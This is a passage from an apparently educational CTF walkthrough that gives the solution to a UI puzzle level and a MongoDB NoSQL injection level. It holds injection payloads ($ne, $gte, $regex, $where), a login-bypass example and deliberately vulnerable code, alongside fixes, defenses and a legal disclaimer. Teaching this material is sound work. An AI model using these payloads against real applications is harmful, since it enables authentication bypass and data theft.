**Step 2: Click Them in Order**

Click **ERR-11** → It highlights green ✅

Click **ERR-44** → It highlights green ✅

Click **ERR-31** → It highlights green ✅

✅ **Success!**
```
EXECUTION ACCEPTED
KEY 3 RECOGNIZED
```

Fragment collected: `YOU_ARE`

**⚠️ Warning:** If you click a wrong color, the screen shakes and all selections reset!

#### **Final Phase: Flag Assembly**

**What Happens:**

The server combines all fragments:
```
INTERFACE_ + NOT_BROKEN_ + YOU_ARE
= INTERFACE_NOT_BROKEN_YOU_ARE
```

Then computes a SHA1 hash and wraps it in the flag format:
```
FLAG{INTERFACE_NOT_BROKEN_YOU_ARE}
```

✅ **The flag is auto-submitted!**

The interface stabilizes:
```
INTERFACE RESTORED
Status: OPERATIONAL
```

"Continue" button appears → Advance to Level 3.2

### 🏁 Flag
```
FLAG{INTERFACE_NOT_BROKEN_YOU_ARE}
```

### 💡 Key Learning

**The Twist:**

The interface was **never actually broken**! It was a test of:

1. **Pattern Recognition**: Spotting the 5-click requirement
2. **Gaming Culture Knowledge**: Recognizing the Konami Code
3. **Observation Skills**: Identifying red errors
4. **Patience**: Waiting for hints instead of giving up
5. **Creative Thinking**: Understanding the "broken" appearance was intentional

**The Message:**

> "The broken interface was never broken. You are."

💡 **Meaning:**
- Sometimes problems aren't technical bugs - they're perception issues
- We assume things are broken when they're just unfamiliar
- Testing our assumptions is critical in security research

**Real-World Parallels:**

In security testing and CTF challenges:
- **Misdirection**: Things that look broken might be clues
- **Pattern Recognition**: Many vulnerabilities follow patterns
- **Patience**: Some solutions require observation over time
- **Creative Thinking**: Not all problems are solved with code

**Skills Practiced:**
- ✅ UI interaction analysis
- ✅ Pattern recognition
- ✅ Timing-based challenges
- ✅ Color/visual discrimination
- ✅ Patience and persistence

---

## Level 3.2: The Database Whisper (NoSQL Injection)

**Difficulty:** ⭐⭐⭐⭐⭐ Expert
**Concept:** NoSQL Injection (MongoDB)
**OWASP:** A03:2021 – Injection
**Time:** 20-40 minutes

### 🎯 Objective
Exploit a NoSQL injection vulnerability in an employee search system to find and extract the Ghost Administrator's secret credentials.

### 👀 What You'll See

- Title: "Level 3.2 — The Database Whisper"
- An **"Employee Search Portal"**
- Intelligence panel showing:
  ```
  Total Employees: 10
  Departments: Engineering, HR, Finance, Security, Operations
  Clearance Levels: 1-5 (Level 5 is highest)
  ```
- A search input field (simple mode)
- "Advanced Mode" button
- Search results area
- Hints section (collapsible)

### 🔍 Discovery Flow & Solution

#### **Phase 1: Reconnaissance**

**Step 1: Try a Normal Search**

Type a common name:
```
John Smith
```

Click "SEARCH"

Result:
```json
{
  "found": true,
  "employee": {
    "employeeId": "ENG001",
    "name": "John Smith",
    "department": "Engineering",
    "clearanceLevel": 2,
    "email": "john.smith@nebulacorp.internal",
    "role": "Senior Developer",
    "status": "Active"
  }
}
```

💡 **Observations:**
- Search works with employee names
- Returns basic employee data
- Clearance level 2 (not very high)
- No secret data revealed

**Step 2: Try Other Names**

Search for:
- `Sarah Johnson` → Found (clearance 2)
- `Dr. Marcus Lee` → Found (clearance 3)
- `Ghost Administrator` → Not found! ❌

💡 **The Ghost Admin isn't in the public directory!**

**Step 3: Switch to Advanced Mode**

Click **"Show Advanced"** button

The interface changes to show JSON input:
```json
{"name": "John Smith"}
```

💡 **AHA! The search accepts JSON!** This means the API likely passes this directly to MongoDB.

#### **Phase 2: Understanding NoSQL Injection**

**Step 4: Think Like a Database**

MongoDB queries look like:
```javascript
db.employees.findOne({ name: "John Smith" })
```

If the API accepts JSON from the user:
```javascript
const query = req.body; // User input!
db.employees.findOne(query);
```

💡 **This is dangerous!** We can inject MongoDB operators!

**Step 5: Research MongoDB Operators**

Common MongoDB operators:
- `$eq`: Equal to
- `$ne`: Not equal to
- `$gt`: Greater than
- `$gte`: Greater than or equal
- `$lt`: Less than
- `$regex`: Regular expression match

💡 **We can use these to bypass filters!**

#### **Phase 3: Exploitation Strategies**

**Method 1: Not Equal ($ne) Attack**

**Step 6: Bypass Name Filter**

Instead of searching for a specific name, search for "NOT equal to something common":

```json
{"name": {"$ne": "Guest"}}
```

Click "SEARCH"

💡 **This matches the FIRST employee whose name is NOT "Guest"**

Try excluding different names to enumerate:
```json
{"name": {"$ne": "John Smith"}}
```
Returns a different employee!

**Method 2: Clearance Level Filter** ⭐ **RECOMMENDED**

**Step 7: Target High-Clearance Users**

The intelligence panel says clearance levels go up to 5. Let's find employees with the highest clearance:

```json
{"clearanceLevel": {"$gte": 5}}
```

Translation: "Find employees where clearanceLevel ≥ 5"

Click "SEARCH"

💥 **JACKPOT!**

```json
{
  "found": true,
  "flagFound": true,
  "employee": {
    "employeeId": "ADMIN001",
    "name": "Ghost Administrator",
    "department": "Security",
    "clearanceLevel": 5,
    "email": "ghost.admin@nebulacorp.internal",
    "role": "Chief Security Officer",
    "status": "Hidden",
    "secretData": "FLAG{NO_SQL_YES_INJECTION}"
  },
  "message": "High-clearance profile accessed"
}
```

✅ **Flag found!** The `secretData` field contains the flag!

The flag is **auto-submitted** and you advance to the final completion page!

**Method 3: Regex Pattern Matching**

**Alternative Step 7:**

Use regex to find names starting with "Ghost":
```json
{"name": {"$regex": "^Ghost"}}
```

This also finds the Ghost Administrator! ✅

**Method 4: Role-Based Search**

**Alternative:**
```json
{"role": {"$regex": "Chief"}}
```

Finds the Chief Security Officer (Ghost Admin)! ✅

**Method 5: Department Search**

**Alternative:**
```json
{"department": "Security", "clearanceLevel": {"$gt": 4}}
```

Finds Security department members with clearance > 4! ✅

#### **Additional Exploration**

**Try This:**

Get ALL employees (dangerous!):
```json
{"name": {"$ne": null}}
```

Get employees by status:
```json
{"status": "Hidden"}
```

Get by email domain:
```json
{"email": {"$regex": "@nebulacorp.internal$"}}
```

### 🏁 Flag
```
FLAG{NO_SQL_YES_INJECTION}
```

### 💡 Key Learning

#### **What Is NoSQL Injection?**

NoSQL injection is similar to SQL injection, but targets NoSQL databases like MongoDB, CouchDB, Redis, etc.

**Classic SQL Injection:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
```

**NoSQL Injection (MongoDB):**
```json
{"username": {"$ne": null}}
// Returns all users!
```

#### **Why This Vulnerability Exists**

**Vulnerable Code:**
```javascript
// ❌ DANGEROUS!
app.post('/api/search', async (req, res) => {
  const searchQuery = req.body; // Direct user input!

  // Passes user input directly to MongoDB
  const result = await Employee.findOne(searchQuery);

  res.json(result);
});
```

**What Went Wrong:**
1. User controls the entire query object
2. User can inject MongoDB operators ($ne, $gt, $regex, etc.)
3. No validation or sanitization
4. No type checking

**Secure Code:**
```javascript
// ✅ SECURE
app.post('/api/search', async (req, res) => {
  const { name } = req.body;

  // Validate input type
  if (typeof name !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // Sanitize (remove operators)
  const sanitizedName = name.replace(/^\$/, '');

  // Use explicit query structure
  const query = {
    name: sanitizedName, // Only exact match
    status: 'Active'     // Only active employees
  };

  const result = await Employee.findOne(query);

  // Don't return sensitive fields
  const safeResult = {
    name: result.name,
    department: result.department,
    // Don't include secretData!
  };

  res.json(safeResult);
});
```

#### **Real-World NoSQL Injection Examples**

**Authentication Bypass:**
```javascript
// Login form sends:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}

// Vulnerable code:
const user = await User.findOne(req.body);
if (user) {
  // Login successful!
  // Attacker bypassed password check!
}
```

**Data Extraction:**
```javascript
// Vulnerable search:
{"email": {"$regex": "^a"}} // Emails starting with 'a'
{"email": {"$regex": "^b"}} // Emails starting with 'b'
// Can enumerate all emails character by character!
```

**Privilege Escalation:**
```javascript
// Update your own role:
{
  "userId": "123",
  "role": {"$ne": "user"} // Change to anything that's not "user"!
}
```

#### **Defense Strategies**

**1. Input Validation**
```javascript
// Type checking
if (typeof input.name !== 'string') {
  throw new Error('Invalid input type');
}

// Whitelist allowed fields
const allowedFields = ['name', 'email', 'department'];
const cleanQuery = {};
for (const field of allowedFields) {
  if (req.body[field]) {
    cleanQuery[field] = req.body[field];
  }
}
```

**2. Sanitization**
```javascript
// Use mongo-sanitize library
const mongoSanitize = require('mongo-sanitize');
const clean = mongoSanitize(req.body);
```

**3. Object Mapping**
```javascript
// Don't use user input directly
const query = {
  name: String(req.body.name), // Force to string
  department: String(req.body.department)
};
```

**4. Use ORMs/ODMs Properly**
```javascript
// Mongoose with strict schema
const UserSchema = new Schema({
  name: { type: String, required: true },
  email: { type: String, required: true }
}, { strict: true });

// strict: true prevents unknown fields
```

**5. Principle of Least Privilege**
```javascript
// MongoDB user should only have necessary permissions
// Don't give full admin access to application database user
db.createUser({
  user: 'appUser',
  pwd: 'password',
  roles: [
    { role: 'readWrite', db: 'appDB' },
    // Not 'root' or 'dbAdmin'!
  ]
});
```

**6. Query Allowlisting**
```javascript
// Only allow specific query patterns
const allowedQueries = {
  byName: (name) => ({ name: String(name) }),
  byDept: (dept) => ({ department: String(dept) }),
  byId: (id) => ({ _id: ObjectId(id) })
};

// User specifies query type
const queryType = req.body.queryType;
const queryValue = req.body.value;

if (!allowedQueries[queryType]) {
  return res.status(400).json({ error: 'Invalid query' });
}

const query = allowedQueries[queryType](queryValue);
```

#### **Testing for NoSQL Injection**

**Manual Testing:**
```json
// Try these payloads:
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$where": "this.password == 'test'"}}
```

**Automated Tools:**
- **NoSQLMap**: Automated NoSQL injection tool
- **Burp Suite**: With NoSQL injection extensions
- **OWASP ZAP**: Web application security scanner

#### **Impact of NoSQL Injection**

**What Attackers Can Do:**
- 🔓 **Authentication Bypass**: Login without credentials
- 📊 **Data Extraction**: Steal sensitive information
- 🔨 **Data Modification**: Change or delete records
- ⬆️ **Privilege Escalation**: Become admin
- 💥 **Denial of Service**: Crash the database

**Famous Breaches:**
- Multiple MongoDB databases exposed due to NoSQL injection
- Authentication bypasses in web applications
- Data exfiltration from e-commerce platforms

#### **OWASP Resources**

- **OWASP NoSQL Injection**: https://owasp.org/www-community/attacks/NoSQL_injection
- **MongoDB Security Checklist**: https://docs.mongodb.com/manual/administration/security-checklist/

#### **Golden Rules**

1. **Never trust user input** - Especially when it's used in database queries
2. **Validate and sanitize everything** - Check types, remove operators
3. **Use parameterized queries** - Or proper ORM/ODM features
4. **Principle of least privilege** - Database users should have minimal permissions
5. **Regular security audits** - Test for injection vulnerabilities
6. **Keep libraries updated** - Security patches are important

---

## 🎓 OWASP Mapping Summary

| Level | OWASP Category | Vulnerability | Severity |
|-------|----------------|---------------|----------|
| 1.1 | Information Disclosure | HTML Comments Exposure | Low |
| 1.2 | A04: Insecure Design | Client-Side Validation Only | Medium |
| 1.3 | A04: Insecure Design | Client-Side Security Logic | Medium |
| 1.4 | A01: Broken Access Control | Hidden Endpoints Without Auth | Medium |
| 2.1 | A01: Broken Access Control | IDOR (Insecure Direct Object Reference) | High |
| 2.2 | A07: Identification Failures | Unsigned/Weak Token Manipulation | Critical |
| 3.1 | N/A | Interactive Puzzle (Pattern Recognition) | N/A |
| 3.2 | A03: Injection | NoSQL Injection | Critical |

---

## 🛡️ Security Best Practices Summary

### For Developers

#### **1. Input Validation & Sanitization**
```javascript
// Always validate
if (typeof input !== 'string' || input.length > 255) {
  throw new Error('Invalid input');
}

// Sanitize
const clean = input.replace(/<script>/gi, '');
```

#### **2. Server-Side Validation**
```javascript
// ❌ NEVER rely on client-side only
<input maxLength={15} />

// ✅ ALWAYS validate server-side too
if (input.length > 15) {
  return res.status(400).json({ error: 'Too long' });
}
```

#### **3. Proper Authentication & Authorization**
```javascript
// Check BOTH:
// 1. Is user logged in? (Authentication)
// 2. Is user allowed to do this? (Authorization)

app.get('/admin', requireAuth, requireRole('admin'), (req, res) => {
  // User is authenticated AND authorized
});
```

#### **4. Use Signed Tokens**
```javascript
// ✅ Use JWT with signatures
const jwt = require('jsonwebtoken');
const token = jwt.sign(payload, SECRET_KEY, { expiresIn: '1h' });

// ✅ Verify signatures
const decoded = jwt.verify(token, SECRET_KEY);
```

#### **5. Parameterized Queries**
```javascript
// ❌ SQL Injection vulnerable
db.query(`SELECT * FROM users WHERE id = ${userId}`);

// ✅ Parameterized
db.query('SELECT * FROM users WHERE id = ?', [userId]);

// ❌ NoSQL Injection vulnerable
db.findOne(req.body);

// ✅ Sanitized
db.findOne({ name: String(req.body.name) });
```

#### **6. Secure Headers**
```javascript
// Use helmet.js
const helmet = require('helmet');
app.use(helmet());

// Manual headers
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');
res.setHeader('Content-Security-Policy', "default-src 'self'");
```

#### **7. Rate Limiting**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

#### **8. Error Handling**
```javascript
// ❌ Don't expose internal errors
catch (err) {
  res.status(500).json({ error: err.message }); // Leaks info!
}

// ✅ Generic errors to users
catch (err) {
  console.error(err); // Log internally
  res.status(500).json({ error: 'Internal server error' });
}
```

### For Security Testers / Learners

#### **1. Reconnaissance**
- View page source
- Check Network tab
- Look for patterns
- Read error messages
- Check comments

#### **2. Test Common Vulnerabilities**
- Client-side bypasses
- IDOR on all IDs
- Token manipulation
- Injection attacks
- Hidden endpoints

#### **3. Use Developer Tools**
- Browser DevTools (F12)
- Network inspection
- Console for testing
- Element inspector

#### **4. Think Like an Attacker**
- Question assumptions
- Test edge cases
- Try unexpected inputs
- Look for information leaks

#### **5. Practice Ethically**
- Only test authorized systems
- CTF platforms are safe
- Never attack without permission
- Responsible disclosure

---

## 📚 Additional Resources

### **OWASP Resources**
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheets**: https://cheatsheetseries.owasp.org/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **OWASP NoSQL Injection**: https://owasp.org/www-community/attacks/NoSQL_injection

### **Practice Platforms**
- **TryHackMe**: https://tryhackme.com/ (Beginner-friendly)
- **HackTheBox**: https://www.hackthebox.com/ (Intermediate/Advanced)
- **PicoCTF**: https://picoctf.org/ (Educational CTF)
- **OverTheWire**: https://overthewire.org/wargames/ (Command-line challenges)
- **PortSwigger Academy**: https://portswigger.net/web-security (Free web security training)

### **Learning Resources**
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/ (Deliberately insecure app)
- **Damn Vulnerable Web App (DVWA)**: https://github.com/digininja/DVWA
- **Bug Bounty Platforms**: HackerOne, Bugcrowd, Synack
- **Books**:
  - "The Web Application Hacker's Handbook"
  - "OWASP Testing Guide"

### **Tools**
- **Burp Suite**: Web proxy for security testing
- **OWASP ZAP**: Open-source web app scanner
- **SQLMap**: Automated SQL injection tool
- **NoSQLMap**: NoSQL injection tool
- **Postman**: API testing
- **curl**: Command-line HTTP client

---

## ⚖️ Ethical Hacking & Legal Disclaimer

### **IMPORTANT LEGAL NOTICE**

The techniques learned in this CTF are for **educational purposes only**.

### ✅ **Legal & Ethical Uses:**

1. **Authorized Testing**
   - Systems you own
   - Systems you have written permission to test
   - CTF platforms and practice labs
   - Bug bounty programs with clear rules

2. **Learning**
   - Educational environments
   - Your own applications
   - Practice labs (TryHackMe, HackTheBox, etc.)

3. **Career Development**
   - Preparing for security certifications (CEH, OSCP, etc.)
   - Building security skills
   - Demonstrating knowledge to employers

### ❌ **Illegal & Unethical Uses:**

1. **Unauthorized Access**
   - Accessing systems without permission
   - Testing production systems without authorization
   - Bypassing security on systems you don't own

2. **Data Theft**
   - Stealing sensitive information
   - Accessing other users' data
   - Downloading unauthorized databases

3. **Disruption**
   - Denial of Service (DoS) attacks
   - Deleting or modifying data
   - Interrupting business operations

4. **Malicious Intent**
   - Ransomware deployment
   - Credential harvesting
   - Social engineering attacks
   - Selling vulnerabilities to criminals

### **Legal Consequences**

Unauthorized hacking can result in:
- **Criminal charges** (Computer Fraud and Abuse Act, etc.)
- **Fines** up to millions of dollars
- **Prison time** (felony charges)
- **Civil lawsuits** for damages
- **Career destruction**

### **Responsible Disclosure**

If you find a real vulnerability:

1. **Don't exploit it maliciously**
2. **Contact the organization privately**
3. **Give them time to fix it** (typically 90 days)
4. **Don't publicly disclose until patched**
5. **Follow bug bounty program rules**

### **Bug Bounty Programs**

Earn money legally by finding bugs:
- **HackerOne**: https://www.hackerone.com/
- **Bugcrowd**: https://www.bugcrowd.com/
- **Synack**: https://www.synack.com/

### **Golden Rule**

> **If you don't have explicit, written permission to test a system, DON'T TEST IT.**

---

## 🏆 Congratulations!

### **You've Completed the NebulaCorp Security Audit CTF!**

### **What You've Learned:**

✅ **Level 1 - Client-Side Security Failures:**
- Information disclosure via HTML comments
- Client-side validation bypass
- JavaScript security bypass
- Hidden endpoint discovery

✅ **Level 2 - Server-Side Vulnerabilities:**
- IDOR (Insecure Direct Object Reference)
- Token manipulation and forgery
- Authentication and authorization failures

✅ **Level 3 - Advanced Techniques:**
- Pattern recognition and creative problem-solving
- NoSQL injection attacks
- Database query manipulation

### **Skills Acquired:**

🔧 **Technical Skills:**
- Browser DevTools proficiency
- JavaScript manipulation
- Base64 encoding/decoding
- API endpoint discovery
- Database injection techniques
- Token analysis

🧠 **Security Mindset:**
- Thinking like an attacker
- Questioning assumptions
- Recognizing common vulnerability patterns
- Understanding defense mechanisms

### **Next Steps in Your Security Journey:**

#### **1. Continue Practicing:**
- Join CTF competitions
- Practice on platforms like TryHackMe, HackTheBox
- Build vulnerable apps and secure them
- Contribute to open-source security projects

#### **2. Deepen Your Knowledge:**
- Study the OWASP Top 10 in detail
- Learn about secure coding practices
- Understand different attack vectors
- Study cryptography basics

#### **3. Get Certified:**
Consider certifications:
- **CompTIA Security+** (Entry-level)
- **CEH (Certified Ethical Hacker)** (Intermediate)
- **OSCP (Offensive Security Certified Professional)** (Advanced)
- **CISSP** (Management-level)

#### **4. Build Things:**
- Create your own CTF challenges
- Develop security tools
- Contribute to security research
- Write security blog posts

#### **5. Join the Community:**
- Attend security conferences (DEF CON, Black Hat, BSides)
- Join local security meetups
- Participate in online forums
- Follow security researchers on Twitter

### **Career Paths:**

🎯 **Penetration Tester**: Find vulnerabilities in systems
🛡️ **Security Engineer**: Build secure systems
🔍 **Security Analyst**: Monitor and respond to threats
💼 **Security Consultant**: Advise organizations on security
🐛 **Bug Bounty Hunter**: Find bugs and earn rewards
📚 **Security Researcher**: Discover new vulnerabilities

### **Remember:**

> **"With great power comes great responsibility."**

Use your skills:
- ✅ To protect
- ✅ To educate
- ✅ To build better software
- ❌ Never to harm or exploit

### **Thank You for Playing!**

We hope you enjoyed the NebulaCorp Security Audit CTF and learned valuable security concepts.

**Keep Learning, Stay Curious, Hack Ethically! 🚀**

---

## 📝 Quick Reference Card

### **Common Techniques Cheat Sheet**

```
┌─────────────────────────────────────────────────┐
│ CLIENT-SIDE BYPASSES                            │
├─────────────────────────────────────────────────┤
│ View Source:         Ctrl+U (Cmd+Option+U)      │
│ DevTools:            F12                        │
│ Bypass maxLength:    element.maxLength = 999    │
│ Override function:   window.func = () => false  │
│ Base64 decode:       atob("string")             │
│ Base64 encode:       btoa("string")             │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│ API TESTING                                     │
├─────────────────────────────────────────────────┤
│ Fetch API:                                      │
│   fetch('/api/endpoint', {                      │
│     method: 'POST',                             │
│     headers: {'Content-Type': 'application/json'},│
│     body: JSON.stringify({data: 'value'})       │
│   }).then(r => r.json())                        │
│     .then(console.log)                          │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│ NoSQL INJECTION OPERATORS                       │
├─────────────────────────────────────────────────┤
│ Not equal:       {"field": {"$ne": "value"}}    │
│ Greater than:    {"field": {"$gt": 5}}          │
│ Regex match:     {"field": {"$regex": "^pattern"}}│
│ Exists:          {"field": {"$exists": true}}   │
└─────────────────────────────────────────────────┘
```

---

*NebulaCorp CTF Platform*
*Created for Educational Security Training*
*Practice Responsible Disclosure*
*© 2024 - Educational Use Only*
